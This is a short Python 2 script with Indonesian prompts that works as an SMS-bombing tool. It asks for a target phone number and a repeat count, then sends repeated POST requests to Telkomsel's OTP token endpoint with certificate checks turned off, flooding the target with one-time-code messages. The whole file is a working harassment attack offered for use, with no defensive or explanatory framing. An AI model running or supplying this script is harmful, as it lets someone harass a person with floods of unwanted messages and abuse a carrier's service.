#!/usr/bin/env python

import requests
# disable InsecureRequestWarning
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

nomor = raw_input("[-] Nomor Target	: ")
banyaknya = raw_input("[-] Spam limit	: ")

print ""
for i in range(int(banyaknya)):
	res = requests.post('https://mobi.telkomsel.com/ulang/token', data={ "msisdn" : "%s" %nomor }, verify=False)
	print "[*] Status ->", 'Sukses' if res.json()['status'] == '1' else 'Gagal'
print ""
print "[x] Done"
